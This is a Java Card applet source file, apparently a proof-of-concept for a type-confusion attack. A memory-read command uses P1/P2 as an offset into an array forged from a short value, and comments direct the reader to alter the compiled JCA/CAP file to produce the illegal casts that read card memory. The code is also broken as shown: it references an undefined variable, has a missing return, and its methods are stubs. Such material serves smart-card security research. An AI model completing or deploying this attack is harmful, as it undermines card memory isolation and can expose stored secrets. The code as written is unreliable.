/*******************************
 * Package : 01 02 03 04 02
 * 
 * Applet  : 01 02 03 04 02 01
 * 
 ******************************/

package packageA;

import javacard.framework.*;

/**
 *
 * @author swatch
 */

public class ServerApplet extends Applet implements MSI{

    private final static byte CLA_SIMPLEAPPLET          = (byte)0xB0 ;

    private final static byte INS_READ_MEMORY           = (byte)0x71 ;

    byte[] ServerAID = {(byte)0x01, (byte)0x02, (byte)0x03, (byte)0x04, (byte)0x01, (byte)0x01};
    
    byte[] ClientAID = {(byte)0x01, (byte)0x02, (byte)0x03, (byte)0x04, (byte)0x02, (byte)0x01};
    
    public static void install( byte[] bArray, short bOffset, byte bLength ) {
        new ServerApplet(bArray, bOffset, bLength);
    }

    protected ServerApplet(byte[] bArray, short bOffset, byte bLength) {
        register();
    }
    
    public Shareable getShareableInterfaceObject(AID aid, byte parameter) {
      	if(clientAID.equals(ClientAID, (short)0, (byte) ClientAID.length))
            return this;
    }

    public void process(APDU apdu) throws ISOException{
        
        byte[] apduBuffer = apdu.getBuffer();

        if (selectingApplet())
            return;

        if(apduBuffer[ISO7816.OFFSET_CLA] == CLA_SIMPLEAPPLET){
            switch ( apduBuffer[ISO7816.OFFSET_INS] ){
                case INS_READ_MEMORY: {
                    processReadMemory(apdu);
                    break;
                }
              
                default :
                    ISOException.throwIt( ISO7816.SW_INS_NOT_SUPPORTED ) ;
                break ;
            }
        }
        else ISOException.throwIt(ISO7816.SW_CLA_NOT_SUPPORTED);
    }

    void processReadMemory(APDU apdu){

        byte[] apduBuffer = apdu.getBuffer();
        
        byte b1 = apduBuffer[ISO7816.OFFSET_P1];
        byte b2 = apduBuffer[ISO7816.OFFSET_P2];
        
        short offset = Util.makeShort(b1, b2);

        short byteArrayAddress = getByteArrayAddress(apduBuffer);
        
        byte[] temp = castShortToByteArray(byteArrayAddress);
                
        apdu.setOutgoing();
        apdu.setOutgoingLength( (short) (2) );
        
        /* Take the offset from P1 and P2 and set it as offset to temp array */
        Util.arrayCopy(temp, offset, apduBuffer, (short)0, (short)2);
        
        apdu.sendBytes((short)0 , (short) (2));
    }
    
    /* Ill-Typed method which is supposed to give the memory reference of the byte array passed as parameter */
    public short getByteArrayAddress(byte[] bufferArray){
        short byteArrayAddress = (byte) 0x7777; //Any random byte
        bufferArray[0] = (byte)0x11; //Any random byte
        
        /* Manipulate the jca/cap file to return short type of the byte array parameter */
        return byteArrayAddress;
    }
    
    /* Ill−Typed method which is supposed to perform illegal casting of a short value to a byte array reference */
    public byte[] castShortToByteArray(short addressValue) { 
        short tempShort = addressValue;
        byte[] tempByte = null;
        
        /* Manipulate the jca/cap file to cast short to byte array  */
 	return null; 
    }
}
